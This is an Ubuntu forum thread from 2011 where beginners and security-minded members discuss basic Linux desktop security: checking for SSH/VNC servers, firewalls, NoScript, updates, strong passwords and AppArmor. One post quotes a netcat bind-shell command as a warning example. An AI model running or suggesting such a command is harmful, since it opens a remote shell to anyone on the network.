---
title: "Security for newbies"
date: 2011-11-01
forum: Security
---

### Post by MrLeek on 2011-11-01
Don't get me wrong, the sticky posts are great and I've learnt a lot from them.

But are there simple tips/suggestions for new users to make sure the security is set correctly? Again, I can't stress enough that the sticky's are good - I've read bodhl.zazen's security thread about 5 times already and I'm still picking up new things.

Then you get a part that says:

> 
[FONT=Arial][SIZE=2][COLOR=darkred]**The two most common cracks posted on these forums are ssh and vnc, both running with password authentication.**[/COLOR][/SIZE][/FONT]

Do I use them? How will I know? Brain is starting to hurt....!! :P

Maybe it's me - perhaps it's just a case of guru's encouraging the newbies to keep reading and keep asking questions. But maybe a FAQ-style guide will work - the best help I can be is to try and compile a guide filled with guru tips.

---

### Post by Dangertux on 2011-11-01
> **MrLeek said:**
> Don't get me wrong, the sticky posts are great and I've learnt a lot from them.

But are there simple tips/suggestions for new users to make sure the security is set correctly? Again, I can't stress enough that the sticky's are good - I've read bodhl.zazen's security thread about 5 times already and I'm still picking up new things.

Then you get a part that says:



Do I use them? How will I know? Brain is starting to hurt....!! :P

Maybe it's me - perhaps it's just a case of guru's encouraging the newbies to keep reading and keep asking questions. But maybe a FAQ-style guide will work - the best help I can be is to try and compile a guide filled with guru tips.

Well... I think there are two things here. For one if you do not KNOW you are using VNC or SSH, then there is probably an issue. You also have to realize that this forum is for questions, we're going to try to answer them the best we can. That being said, it's good to be able to provide in depth explanation and demonstration like the security stickies do.

If you don't understand the basics of linux before reading the security stickies you probably won't get much out of them. Nor will you get much out of an FAQ either. The biggest misconception I've seen on this forum is the assumption that your ability to secure a system can outrun your knowledge of the system you're securing. This is simply not true. If you don't understand its workings, regardless of how many tutorials, guides, stickies and faq's you read your security model will be found lacking.

Hope this helps.

---

### Post by haqking on 2011-11-01
> **Dangertux said:**
> Well... I think there are two things here. For one if you do not KNOW you are using VNC or SSH, then there is probably an issue. You also have to realize that this forum is for questions, we're going to try to answer them the best we can. That being said, it's good to be able to provide in depth explanation and demonstration like the security stickies do.

If you don't understand the basics of linux before reading the security stickies you probably won't get much out of them. Nor will you get much out of an FAQ either. The biggest misconception I've seen on this forum is the assumption that your ability to secure a system can outrun your knowledge of the system you're securing. This is simply not true. If you don't understand its workings, regardless of how many tutorials, guides, stickies and faq's you read your security model will be found lacking.

Hope this helps.

Big +1

We can give you the commands to see if a process is running but if you dont understand what it means then it means very little ;-)

You can see if the ssh daemon is working for example

```
ps -A | grep sshd
```

or you could use netstat to look at port 22 for ssh, or 5900 for VNC, however these are default ports and could have been changed.

---

### Post by WasMeHere on 2011-11-01
[I]Edit - General text for newbies about Servers; the main wiki page is [[COLOR="RoyalBlue"]_https://wiki.ubuntu.com/BasicSecurity_[/COLOR]]("https://wiki.ubuntu.com/BasicSecurity")

Until you do understand how it works, my recommendation would be to not set those things up, and if they are set up by default, disable them. When you're ready to start learning new services like SSH, VNC, Samba (smb), FTP, telnet, remote desktop, etc., then consider playing with them in a virtual machine. Ubuntu has Oracle VM Virtual Box right in the Software Center. This can reduce your exposure to security problems you don't know while you learn. Of course it's not fool-proof.

SSH and Samba are running by default in Ubuntu Server. SSH can be made safer by using an RSA key instead of password to log in.

> I've read bodhl.zazen's security thread about 5 times already and I'm still picking up new things.

Then you get a part that says:

Quote:
The two most common cracks posted on these forums are ssh and vnc, both running with password authentication.
So, if you don't need an SSH server or VNC server running on your personal computer don't do it. If you don't know what those acronyms are, then you should DEFINITELY not use them until you do some significant research.[/I]
________________________

Hi MrLeek,

Have you installed servers for ssh and vnc? Probably not unless you run Ubuntu Server. Without them your computer is not vulnerable to such attacks. You can check in a terminal window with the following command
```
which ssh
``` and instead of Enter press Tab twice
and ```
which vnc
``` and instead of Enter press Tab twice.

If you get only ssh and vncviewer you have only the client programs. You can login on remote computers with them. If you get a response with several alternatives, for example
```
ssh          ssh-agent    ssh-askpass  sshd         ssh-keygen   ssh-vulnkey
ssh-add      ssh-argv0    ssh-copy-id  sshfs        ssh-keyscan  
``` and
```
vnc4-common  vnc-java     vnc-server   vnc-viewer   vnstat       
vnc4server   vncserver    vncsnapshot  vncviewer    vnstati
``` 
you have the servers installed. But are they running? If you type the following command in the terminal (and press Enter)
```
ps -au root | grep ssh   # the command
``` and get the following response (mine is running behind a firewall)
```
  873 ?        00:00:00 sshd   # the response
```
then the ssh server is running
and similarly for
```
ps -au root | grep vnc
```
Finally, the ssh and vnc sessions themselves are like sending letters in an envelope, not open post-cards like email, but they can be attacked. But you should know when you are using ssh and vnc, because you are (inter)active, or at least you have set up an automatic sesssion yourself.

> the best help I can be is to try and compile a guide filled with guru tips. That would be great :-)

Have fun finding out about Ubuntu
Olle

---

### Post by Ms. Daisy on 2011-11-01
> **MrLeek said:**
> Brain is starting to hurt....!! . Yup. Been there done that. New user myself. Obviously I want to secure my machine while I learn Linux.  I spun my wheels searching for a security "package" or simple steps to follow (clearly I'm an ex-Windows user). I guess I was looking for the Linux version of Norton or AVG- just run in the background & I'll feel all warm & fuzzy until I learn enough to tweak it.  As far as I can tell no such thing exists, or at least not one that's worthwhile. So it's a Catch 22.  You want to secure Linux while you learn it, but you have to understand Linux to secure it.  So the only solution I've come up with is to learn Linux along with security measures, kind of using one to further the other.  As far as I'm concerned the only way to learn Linux is to DO Linux along with reading volumes of manuals.  Same seems to go for security measures.  And meanwhile do my banking on the windows partition where I'm more knowledgeable about security.  If anyone's got a better solution, I'm all ears.  

And what's got me flummoxed right now is that a fair amount of the good security measures utilize a server (like ssh & vnc, right?).  But you DO NOT want to install a server until you know what the hell you're doing.  The learn-as-you-do approach on a server will get you cracked.

If you do end up writing a FAQ guide filled with guru tip, I will read it!

---

### Post by WasMeHere on 2011-11-01
@ Dangertux & haqking

You are right, it is easy to make a hole in the firewall, if you are not a good mason. And the same argument applies to data security.

But you can't leave the newbies with a statement, that they don't know, so they cannot be safe. I think it is a good idea to provide tips and hints what to do and what to avoid. What has the Ubuntu mason done, that newbies should not tamper with?

I think there can be a list of tips to decrease the security risks. It is probably also worthwhile to compare the security between different operating systems and different kinds of communication. It is very important to keep economical transactions secure for everybody, not only gurus, so how should that be done?

Having fun finding out
Olle

---

### Post by Dangertux on 2011-11-01
@Olle Wiklund 

While I don't disagree that basic security is something every user should know about. Those topics are covered quite well in the afforementioned stickies. 

Unfortunately as with anything the level of value you take from it is directly proportional to the level of knowledge you have going into it. So tips and tricks are nice, but truthfully if you don't understand the reasoning behind them your level of understanding of some concepts will never move beyond that of hobbyist. 

Hope that clarifies.

---

### Post by WasMeHere on 2011-11-01
Hi Ms. Daisy,

> **Ms. Daisy said:**
> ...  And meanwhile do my banking on the windows partition where I'm more knowledgeable about security.  If anyone's got a better solution, I'm all ears...
I think that the intrinsic security is much better in linux compared to Windows. Add to that the fact that there are so many more Windows computers. So it is much more tempting to make virus, trojans and worms for Windows. Today the smartphones are also a target, and I think they are more vulnerable than Windows computers. But there have been successful attacks against linux too.

Anyway, I do my internet banking from an Ubuntu 10.04 LTS computer. I have a small device with a plastic card with a chip, that I run off-line (without wiring), and create one-off security codes for login and signature.
> **Ms. Daisy said:**
> (@ MrLeek) ... If you do end up writing a FAQ guide filled with guru tip, I will read it!
Yes, I think many people are looking forward to a security FAQ for newbies

Have fun finding out :-)
Olle

---

### Post by Dangertux on 2011-11-01
The first step to securing your environment is to realize that there is no such thing as intrinsic security.

---

### Post by WasMeHere on 2011-11-01
> **Dangertux said:**
> @Olle Wiklund 

While I don't disagree that basic security is something every user should know about. Those topics are covered quite well in the afforementioned stickies. 

Unfortunately as with anything the level of value you take from it is directly proportional to the level of knowledge you have going into it. So tips and tricks are nice, but truthfully if you don't understand the reasoning behind them your level of understanding of some concepts will never move beyond that of hobbyist. 

Hope that clarifies.
Yes I think I understand what you mean. *Edit: And you are right I should not have used the term intrinsic security. What I mean is that the code itself is repaired quickly, when a security hole is found (much faster than Windows). There are not add-on program packages to cater for security (anti-virus programs etc.) although I know that some people have started to use such programs to keep their email free of virus, not infecting linux, but maybe infecting Windows computers, that receive 'forwarded' letters.*

But most people will never be even half as interested in computers as you and I. They will be hobbyists forever. How can we help them to avoid holes in the firewall, virus and trojans? If we tell them to avoid everything, their computers will not be used. If we tell them something they don't understand or don't find because it is embedded in things they don't understand, they might do something that leave them wide open to attacks.

If we can make clear and short information, it will improve the security for most Ubuntu users. And this is what MrLeek intends to do. It will not be easy, but he might be a talented teacher.

---

### Post by haqking on 2011-11-01
> **Olle Wiklund said:**
> 

Yes, I think many people are looking forward to a security FAQ for newbies

Have fun finding out :-)
Olle

I can only speak for myself, but i think i am right in assuming dangertux's opinion may be similar.

The whole FAQ for newbies that you ask for is that holy grail of documents every one wants where it abstracts the complex and makes things simple.

Sorry but that wont happen.

The stickies and such like are the closest you will get to that, thats what we were trying to say, admittedly we are security professionals, and we are not being elitist.

Infact i always try to help out alot here where i can.

The fact is that though we can say do this and that, unless there is a real foundational understanding it is meaningless.  We cannot tell anyone how to secure their machine, if we do it step by step then without understanding what or why it was done those steps can be easily undone without knowing.

Security is a broad subject, ongoing process, steep learning curve and there is no newbie FAQ i am afraid.

The best security is education, and a forum or a FAQ will not give you that.

The best we can do as sec professionals in a support capacity is to keep pushing the need to educate and point out gaping holes when they appear as obvious.

IMHO

Edit: I am talking for myself here and please dont take me as elitist, but more a realist

---

### Post by Thewhistlingwind on 2011-11-01
> **haqking said:**
> 
The best security is education, and a forum or a FAQ will not give you that.


A forum indeed will. However, it's only during the rare juicy bits where the discussion shifts to hows and whys that this happens.

---

### Post by haqking on 2011-11-01
> **Thewhistlingwind said:**
> A forum indeed will. However, it's only during the rare juicy bits where the discussion shifts to hows and whys that this happens.

yeah i didnt put across what i meant there really.

I meant it as , you can be on a forum and listen to others and ask for advice, but the real way to learn security is to do it.
 
Set up VM, real hardware, test and research vulnerabilites, exploits etc.  play with the plethora of tools outs there.

The thing with forums and faq's are.  People are often lazy.  They hear about UFW for example, enable it and think there machine is safe now, and dont know anyhing about what they did other than enabled a firewall.

They use Linux and think they are automatically secure.

People often take advice (and i am generalising) then do it (or not) and thats it.

Unless they take the time to figure out what it all meant it is useless.

And like i say i am generalising, there are alot of people on here and elsewhere who i am sure soak it all up, and go off and maybe themselves get interested so much they end up working in the field.

I refer really to the whole, security FAQ thing, there is no simple explanations for a topic which covers at the minimum 10 themselves very broad domains of knowledge.  

People often look for a fix all command or application, and there isnt one, it is an ongoing process along with the constant education

---

### Post by Dangertux on 2011-11-01
I'm with haqking on this one. Again, not trying to be elitist or all knowing. Admittedly I'm exposed to things by very amazing talented minds every day that truly humble me. 

That being said, an FAQ would be great, and I also would be willing to help. However, there is no short cut here. For instance let's take a commonly asked question.

"Do I need a firewall with Ubuntu?" 

That would certainly be a frequently asked question as I know I've answered it 3-4 times in the last week alone on this forum (and I've been less active then I usually am)

If you look at the answer it is not nearly as simple as the question.

There are a few commonly given answers to this question. For instance.

"You have no open ports so you don't need one."

Now, I'm almost certain if you actually thought about how firewalls work, and how the threats you are exposed to work you might find that using a firewall wit strong inbound and outbound rules is preferable to not using one.

Now that's just a simple recommendation, based on only partial knowledge and a simple question. We can further this by complicating the original situation.

For instance different use cases might require different levels of security. On my personal machine I literally do nothing of consequence, so I'm not going to spend time securing my home network and personal computer that much. I don't use it for banking , I rarely make a purchase on my home computer, in fact I pretty much browse these forums and other websites that amuse me. Or I may play around with some idea I have in a VM. In any case all inconsequential things. 

That being said, someone else in this very thread may work from home and rely on e-commerce to pay their bills. Their needs may be considerably different in terms of security than mine. Their risk is higher, thus their expected loss is higher, rightly they should spend more time securing their home system. 

So suddenly the answer to a six word question isn't really so short anymore, in fact I could increase this wall of text with more information making it a veritable K2 of security factoids.

So when making an FAQ you really have to ask yourself what is the average use case? This is where best practices come into play. Which in my opinion the security stickies cater to nicely.

With the exception of a few things from the stickies that I disagree with, or think could be worded more appropriately I think an FAQ might prove to be a duplication of effort in some regards, unless it somehow became a more comprehensive document, based on questions that forum users asked more specifically than "do I need antivirus". As the cookie cutter security topics in Ubuntu have been covered ad nauseum for those converting from the Windows world.

Hope this clarifies my original point.

---

### Post by WasMeHere on 2011-11-01
@ Dangertux & haqking

I have read several of your posts in the Ubuntu Forums, and I really appreciate your contributions. I realize that you know what you are writing about and that you really want to help the people who are posting questions.

What if MrLeek, Ms. Daisy and I start asking a few questions relevant to us (and maybe to some of our friends)? Other people may show up asking their questions. Do you think that our questions would be relevant to other people? Would your answers be relevant only to us or also to other people in similar situations?

     -o-

I have no incoming port open on my firewall, a simple router + firewall. I have a wired LAN inside the firewall with computers for my family members. The children have dual boot, Linux + Windows (Vista and XP). I have a vanilla Ubuntu 10.04 LTS Desktop where I have installed server demons for ssh and samba to make it easy to share files and scanner. I have also a workstation for multimedia and HD video editing with Ubuntu Studio and Win XP. A printer is attached via the LAN.

Q1 Would you recommend that I shut down the server demons?

Q2 We use Panda (paid) and Avast (free) antivirus in windows. What would you recommend? Do we need antivirus for Linux?

Q3 Is there any email or social network services that we should avoid?

Q4 What about cloud file servers?

Q5 What about internet banking and credit card payment?

Q6 Are there any risks with electronic login and signature via a system via files in the computer (supported by Swedish banks and used by several public service organisations as well as the tax authority.)

*Edit: Q7 I backup my 'workhorse computer' once every month unless a lot of work (or pictures/movies) make me do it more often. I use unison to sync my multimedia partition with an external disk and I use Clonezilla to make images of the other partitions. I keep one external disk in a bank vault, so that my pictures won't burn if the house would burn. The other computers are also cloned but not as frequently.*

Quantum satis: What do you want to add, that I have overlooked at this late hour ;-)

Olle

---

### Post by Dangertux on 2011-11-01
> **Olle Wiklund said:**
> @ Dangertux & haqking

I have read several of your posts in the Ubuntu Forums, and I really appreciate your contributions. I realize that you know what you are writing about and that you really want to help the people who are posting questions.

What if MrLeek, Ms. Daisy and I start asking a few questions relevant to us (and maybe to some of our friends)? Other people may show up asking their questions. Do you think that our questions would be relevant to other people? Would your answers be relevant only to us or also to other people in similar situations?

     -o-

I have no incoming port open on my firewall, a simple router + firewall. I have a wired LAN inside the firewall with computers for my family members. The children have dual boot, Linux + Windows (Vista and XP). I have a vanilla Ubuntu 10.04 LTS Desktop where I have installed server demons for ssh and samba to make it easy to share files and scanner. I have also a workstation for multimedia and HD video editing with Ubuntu Studio and Win XP. A printer is attached via the LAN.

Q1 Would you recommend that I shut down the server demons?

Q2 We use Panda (paid) and Avast (free) antivirus in windows. What would you recommend? Do we need antivirus for Linux?

Q3 Is there any email or social network services that we should avoid?

Q4 What about cloud file servers?

Q5 What about internet banking and credit card payment?

Q6 Are there any risks with electronic login and signature via a system via files in the computer (supported by Swedish banks and used by several public service organisations as well as the tax authority.)

Quantum satis: What do you want to add, that I have overlooked a this late hour ;-)

Olle

Obviously the answer will be most relevant to the situation it is directed at. That is not to say another user could not find themselves in a similar situation or where the information could still be useable.

Now on to the questions

A1) No, I would not recommend disabling daemons that you are utilizing. The goal is to be as secure as possible while maintaining the needed functionality. That being said what I would recommend is that you keep the services up to date with the latest security updates. Also, make sure you are using strong credentials for authentication with those services. I would also recommend making sure they are properly confined inside the local network. For instance if you don't need them accessible from the outside world, or only certain ip's within the network you should use iptables to make that the case. I would also consider enforcing mandatory access controls (Apparmor), paticularly on samba which is the more vulnerable of the two services.

A2) It's my personal belief that an anti-malware solution for linux is a great idea. Too bad nobody makes one that works well that is free or even mildly affordable for home use. Anti-Malware/Virus provides an additional active layer of heuristics based protection that can stop some threats even if not signatured threats. (Again it has to be decent ClamAV doesn't fill the bill)

A3) Yes all of them. However in line with best practices... Use the ones you like. However make sure you're using strong credentials, a browser addon such as NoScript, and security questions that aren't something like "what color is your house that is shown in your profile picture?". Also make sure you're not reusing your passwords across emails and different social networking sites.

A4) What about them? For backing up non-valuable personal files I think they're great. That being said you could argue cloud security is half decent since services like dropbox do rely on a strong encryption method (AES). Depends on what you're putting on them. Your personal financial information. No. Some family photos from your last vacation sure why not?

A5) Again what about it? Force https, don't access it from public wifi  use NoScript.Make sure the rest of your system security is decent, IE: your samba service didn't get exploited because your printer was running a telnet server that you didn't know about and lexmark is bad with updates, and after all this now your home PC is keylogged and rootkitted because someone sniffed your ssh credentials via an ssh version attack

A6) I'm not familiar with the technology the swedish government uses for this so I can't comment.

A7) Good job doing back ups, but that's not a question.

Extra Credit : Don't give attackers more information than they need. For instance, an  explanation of every service operating system and relative patch level running on your network, probably shouldn't be posted on the internet.

Hope this helps

---

### Post by haqking on 2011-11-01
ok well Dangertux covered everything well there.

One point i will mention, as we already pointed out it is all about education.  And it is often very hard to give specific answers without really having access to the network or details of.

I would like to draw something from your post, the "what about cloud server" question.  This is what we mean, how do we answer a non specific question that covers a topic which covers so many broad domains.

For the most part a cloud server is just a server in a cloud, the security principles remain the same.

email and social sites.  well what can we say without an understanding of email transport mechanisms and protocols, social sites and there XSS and CSFR issues etc, data mining etc.

Every security question can cover multiple areas which all rely on foundational topics.

---

### Post by WasMeHere on 2011-11-01
Thank you *Dangertux & haqking*

for the clarifying answers and for your patience! I have to look into AppArmor and NoScript.

Your answers created new questions.

Q8 What do you know about the Brother drivers for network printers?

Q9 A relative of mine uses Avast antivirus for Linux. Do you know anything about it?

Q10 Would it be a good idea to do the economical transactions from the multimedia computer instead of the 'workhorse', because there are no servers for ssh, samba and printer. And it is switched off most of the time (Ubuntu Studio 11.04, Natty).

Having fun finding out :-)
Olle

---

### Post by Dangertux on 2011-11-02
> **Olle Wiklund said:**
> Thank you *Dangertux & haqking*

for the clarifying answers and for your patience! I have to look into AppArmor and NoScript.

Your answers created new questions.

Q8 What do you know about the Brother drivers for network printers?

Q9 A relative of mine uses Avast antivirus for Linux. Do you know anything about it?

Q10 Would it be a good idea to do the economical transactions from the multimedia computer instead of the 'workhorse', because there are no servers for ssh, samba and printer. And it is switched off most of the time (Ubuntu Studio 11.04, Natty).

Having fun finding out :-)
Olle

A8 ) Don't know of any vulnerabilities off the top of my head without researching them (this doesn't mean they're not there)

A9) I've tested it, it's pretty much useless against anything other than known Windows Malware.

A10) Obviously separation of resources will help strengthen your security model. Ever hear the expression "Don't put all your eggs in one basket"? Same concept here. So long as the overall security level of the "workhorse" system is equal or better than the overall level of the server.

Hope that helps.

---

### Post by vasa1 on 2011-11-02
> **Olle Wiklund said:**
> Thank you *Dangertux & haqking*

for the clarifying answers and for your patience! I have to look into AppArmor and NoScript.
...

I'm reading this thread with great interest and some of the newbie comments certainly reflect my concerns as well.

I also empathize with the experts point of view but a greater adoption of Linux is going to mean more people wanting "security" out of the box with little or no effort on their part.

To some extent, the problem could be broken down into two parts. 

The first would be making things more secure fundamentally, using the strengths of Linux.

The second would be educating people about "social engineering" which is basically parting with information about oneself to crooks, installing software provided by crooks, and the like.

I feel the second aspect, including using a browser safely, can be picked up anywhere but the first has to come from Linux-specific education.

I can point to so many sources that claim that Linux is safe out of the box, but then, after poking about a bit, one reads about 
people who've enabled ufw and experts who have locked stuff down using AppArmor.

As Ms. Daisy said, we who've moved over from Windows, miss our blankets.

I would welcome a tutorial for dummies about security for the home user of Linux.

---

### Post by MrLeek on 2011-11-02
Some excellent replies, both from my fellow newbies and the guru's. No way I can comment on every aspect that's been covered but I'll try my best here.
> **Dangertux said:**
> Well... I think there are two things here. For one if you do not KNOW you are using VNC or SSH, then there is probably an issue.....If you don't understand the basics of Linux before reading the security stickies you probably won't get much out of them....
I agree. The more you know about a subject, the more informed you are &#8211; and you know what you don't know (if you follow me). But newbies coming from Windows have existed with a security blanket around them &#8211; they know they have AV installed, etc. (that doesn't mean that the system is more secure or not, just that Windows users can at least &#8220;see&#8221; security on their systems.
So how do I find out if I have VNC or SSH? Olle's post was great and  great basis to answering that question. VNC did nothing (so I'm assuming that's not running?) but SSH showed that the server programs were listed (eek!). When I try 
```
ps -au root | grep ssh   # the command
```nothing happens. Good or bad? That's the sort of info I think is useful to newbies.

So the FAQ for this particular bit looks a bit like this:
The two most common cracks posted on these forums are ssh and vnc, both running with password authentication&#8221; (source: bodhi.zazen's awesome security sticky)
 
[LIST]
[*]  Do you know what ssh and vnc are? If not then you need to make sure that they're turned off as you almost certainly don't need them!! 
[*]  Insert instructions on how to check for ssh/vnc and to ensure that it's not running.
[*]   Want to learn more about ssh and vnc? *Insert links to material here*
[/LIST]
[QUOTE=Olle Wiklund;11416567] But you can't leave the newbies with a statement, that they don't know, so they cannot be safe. I think it is a good idea to provide tips and hints what to do and what to avoid. What has the Ubuntu mason done, that newbies should not tamper with?

Unfortunately as with anything the level of value you take from it is directly proportional to the level of knowledge you have going into it. So tips and tricks are nice, but truthfully if you don't understand the reasoning behind them your level of understanding of some concepts will never move beyond that of hobbyist. 
Both statements are true. It's impossible to cover every possible scenario, but it may be possible to cover the basics. Plus, implementing these simple tips may encourage users to read more, to learn more...to understand just how powerful a terminal window can be.

This is taking on a life of it's own so I better stop! (hurray!) Let me rephrase my original idea - 10 easy things to increase your security (e.g.): 
[LIST]
[*]Install No Script. Learn how to use it properly (i.e. don't allow everything because No Script annoys you!)
[*]Make sure Automatic Security Updates are turned on (how do I do that? Do x, y and z)
[/LIST]
[SIZE=1][COLOR=#000000][FONT=Verdana, sans-serif]The user may still not understand what he's done, but some will learn new things and look to learn more. From here add something a little more complex (e.g.Why reusing passwords is a bad idea, or why don't I need any AV in Linux?)

I certainly don't want to annoy the security pro's on here &#8211; far from it. But the Linux learning curve can be a little steep and any way to make that curve a little easier to manage will go down well with with us newbies! Plus we'll be asking more intelligent questions...which is bound to be a change for the guru's! :)

---

### Post by WasMeHere on 2011-11-02
> **MrLeek said:**
> ... ```
ps -au root | grep ssh   # the command
``` 
nothing happens. Good or bad? That's the sort of info I think is useful to newbies. 
It means that the server daemon is ***not*** running, which is good if you want to be sure it is not used by an attacker, but bad if you want to use it yourself to login or share files from another computer.

> I certainly don't want to annoy the security pro's on here &#8211; far from it. But the Linux learning curve can be a little steep and any way to make that curve a little easier to manage will go down well with with us newbies! Plus we'll be asking more intelligent questions...which is bound to be a change for the guru's! :)

I think we might do something good together. Thank you for starting this thread, good luck and have fun finding out :-)
Olle

---

### Post by mr-woof on 2011-11-02
I've been using Linux for about 2-3 years now and I stil consider myself inexperienced, I've read a lot of threads on here about systems being broken into and it does seem to come down to remote desktops(VNC) and ssh being enabled incorrectly.

Me personally, on a fresh install of a Ubuntu machine, I always install gufw and enable the firewall, remove remote desktop viewer as I don't need it. You'll have the ssh client installed and that's fine, it's the ssh server you have to be careful with. Disable upnp on your router as well.

Installing ubuntu server in a vm and playing around with ssh server was a good learning experience for me, I'll post what changes I make if anyone wants me to? 

I always install no script/ad blocking in FF as well, very good for secure browsing. Security is a learning experience, using virtual machines is a good way to test,break and fix things.

---

### Post by Ms. Daisy on 2011-11-02
> **haqking said:**
> The whole FAQ for newbies that you ask for is that holy grail of documents every one wants where it abstracts the complex and makes things simple.OK, I'm really feeling this thread.  To Dangertux & haqking, we all seem to agree that you have to dig deep to attain true security.  But is there a way to enable some simple features, especially through the GUI, that can provide a little more security for the average noob **until they get a clue**?  I hardly think I'm unique in my intention to learn Ubuntu by installing it & playing around.  It's that learning window that needs to be sort of temporarily secured so new users aren't completely overwhelmed by that steep learning curve we've all talked about.  So this elusive "Security For New Users" FAQ could actually be created.  Here's what I see as a very rough outline:

1. enable these features using the GUI: firewall, x, y, z. Insert links to resources.
2. check to make sure a, b, c are disabled (as MrLeek suggested)
3. don't be stupid: follow standard good practice while connected to the internet. Insert links to common good internet security tips.
4. if you have to do banking on your Ubuntu computer, then some of the experts recommend that you DO a, b, c.  And they recommend that you don't do x, y, z. Links to resources.
5. once you've learned more about linux, it's imperative that you look into utilizing this, that, and the other thing. Insert links to resources.  I'm gonna say that apparmor goes in this category.  Thoughts?

MrLeek, if you want links to  various tutorials & sources, I'll be happy to provide them.  I've  spent a lot of time looking at the written material on various topics  and they vary in their target audiences.  I've got beginner's eyes, so  I'll give you the "for Dummies" links. PM me if you're serious.  If not,  I may steal your idea :P

---

### Post by Dangertux on 2011-11-02
> **Ms. Daisy said:**
> OK, I'm really feeling this thread.  To Dangertux & haqking, we all seem to agree that you have to dig deep to attain true security.  But is there a way to enable some simple features, especially through the GUI, that can provide a little more security for the average noob **until they get a clue**?  I hardly think I'm unique in my intention to learn Ubuntu by installing it & playing around.  It's that learning window that needs to be sort of temporarily secured so new users aren't completely overwhelmed by that steep learning curve we've all talked about.  So this elusive "Security For New Users" FAQ could actually be created.  Here's what I see as a very rough outline:

1. enable these features using the GUI: firewall, x, y, z. Insert links to resources.
2. check to make sure a, b, c are disabled (as MrLeek suggested)
3. don't be stupid: follow standard good practice while connected to the internet. Insert links to common good internet security tips.
4. if you have to do banking on your Ubuntu computer, then some of the experts recommend that you DO a, b, c.  And they recommend that you don't do x, y, z. Links to resources.
5. once you've learned more about linux, it's imperative that you look into utilizing this, that, and the other thing. Insert links to resources.  I'm gonna say that apparmor goes in this category.  Thoughts?

MrLeek, if you want links to  various tutorials & sources, I'll be happy to provide them.  I've  spent a lot of time looking at the written material on various topics  and they vary in their target audiences.  I've got beginner's eyes, so  I'll give you the "for Dummies" links. PM me if you're serious.  If not,  I may steal your idea :P

Okay, I think there is something that should be addressed with this, and I know I've discussed this with you before Ms. Daisy (at least I think I did). Security is a broad term it's a giant all encompassing vacuum that will quickly 'suck' you in if you let it. 

That being said, that does not mean a reasonable level of security (best practices) are difficult to attain for the average end user. However, when you talk about best practices there is still a level of risk involved that is higher than it could be. 

If you were setting up a home system to be "secure" within the realm of best practices, which would be fine for most (and I mean like 90%+) of the average user's use case.  You might consider things like the following , that have been harped on to no end on this forum already.

1 - Strong passwords. If it takes a password it needs to be a good one (more than 16 characters containing upper and lower case, numeric, special characters and white space. Not being based on a dictionary word, or something like the fact that your eyes are blue or your birth date.) If you can use an RSA key for it (eg: SSH) better still.

2 - Don't run services you don't need. If you don't need an SSH server or VNC server running on your personal computer don't do it. If you do, make  sure it is properly secured. Firewalled from the outside world, confined with apparmor/selinux strong credentials, proper configuration and permissions ,etc. (PS : do NOT run VNC just don't do it.)

3 - Browser addons like NoScript. I can't emphasize enough. Browser exploits get alot of people, usually people who think they're perfectly fine because they run Linux/Mac OSX/Something else other than Windows. This is where 90% of home users who aren't running a server of some kind get in trouble.

4 - Keep your updates , well...updated. This is important, unless you're writing security patches yourself (which you're probably not) this should be way high on your todo list. 

5 - Use your firewall PROPERLY. Don't set it and forget it, learn how it works, set decent rules. It takes 5 minutes to configure UFW/GUFW to tell iptables to enforce pretty decent inbound and outbound rules. Maybe 10 if its the first time you've done it. I harp on this one a lot because by and large the "you have no open ports" argument is stupid.

See this post I made : [http://ubuntuforums.org/showthread.php?t=1871177](http://ubuntuforums.org/showthread.php?t=1871177)

(which btw got a whopping 1 reply thanks for the love everyone :-) I kid..I kid..)

6 - Use common sense. A very smart friend of mine once said these words.

"Did you go on the Internet to download something? No...Then why are you downloading something?"

This applies to all facets of security. Set out with a purpose, if you find yourself veering away from that purpose, ask yourself why and if its something you should be doing. For instance you should not have to run the following command to play supertuxkart.

```

sudo nc -l -p 31337 -e /bin/sh

```*don't do this*

If someone tells you that you do, well...Don't listen.

7 - Least privileges, always : Always make sure you are utilizing the least amount of privileges/permissions to do the task necessary. Use only what you need nothing more. This involves learning about DAC and how to use file permissions and non-privileged users (which Ubuntu makes very easy). Additionally we can strengthen this with things like Apparmor, which I do recommend learning. The learning curve is pretty steep but take a few hours to educate yourself on it now, it is a great asset.

8 - Be consistent, if you do these things with your desktop Ubuntu system you will find it is actually pretty secure. Now apply this to the other devices on your network. This includes any other computers, cell phones, routers, printers, game consoles whatever. Your network's security is only as strong as the weakest link. Once an attacker gains a foothold in a network, whether it's in a DMZ or behind a firewall compromising the rest of the network becomes MUCH easier.

Hope all this helps.

---

### Post by Ms. Daisy on 2011-11-02
My thoughts are flowing on this issue.  I recommend that at the outset you define the target audience for the FAQ.  

This FAQ is intended for the typical, average home user that is in the process of learning how to use Ubuntu. Average home use is:
1. surfing the net
2. playing games online & off line
3. on-line personal banking
4. storing documents that could contain a little sensitive information (like name, address, DOB, SSN, etc)
5. whatever else is typical.

This FAQ is NOT intended for
1. people who use Ubuntu in their corporate environment.  Certain industries must follow certain internet and data storage regulations.  Rely on this thread at your own peril for these uses.
2. If you're a home user that is employed by a company, and you occasionally work on company business on your home computer.  You should consult with your company's IT department to comply with their security measures.
3. Whoever else should be excluded.

---

### Post by Ms. Daisy on 2011-11-02
> **Dangertux said:**
> Security is a broad term it's a giant all encompassing vacuum that will quickly 'suck' you in if you let it. Yeah, too late.:P

Sounds to me like Dangertux just wrote a large chunk of that FAQ.

---

### Post by haqking on 2011-11-02
Dangertux is 5 hours behind me but he seems to be more awake, his caffeine fuelled typing skills are strong in him today ;-)

I myself am battling with some bluetooth issues.

+1 to everything he said

---

### Post by Ms. Daisy on 2011-11-02
Oh yes, and something also to address would be a quick discussion of fallacies that are common in this forum as well as in the world in general:
1. Linux is secure out of the box.  False. It's as secure as you make it, it's as insecure as you allow it.
2. the typical Windows user mindset is that you can install program X, let it  run quietly in the background, and you'll be fine.  That's actually not  true for Windows and it's not true for Ubuntu either. Security is an active process on all OSs.
3. yadda yadda. You get my drift.  There are many of these addressed in this forum, I'd be happy to hunt them down for you.

In fact, nearly all of the information that should go in the FAQ already exists in numerous posts across the forum.  The idea is to combine them into one "Security for Newbies" place.

Again MrLeek, I hope you were serious about writing this FAQ.  I'll help by writing any and all sections you want me to.

---

### Post by Dangertux on 2011-11-02
Awake...it's such an inaccurate term. It's more like what happened in that movie Vanilla Sky without the fringe benefits of being Tom Cruise.

Also something else I didn't cover.

If you use Wireless access. Make sure you're using STRONG encryption, not WEP but WPA/WPA2 with a GOOD passphrase use all 63 characters, you only have to type it once anyway.

---

### Post by WasMeHere on 2011-11-02
> **Ms. Daisy said:**
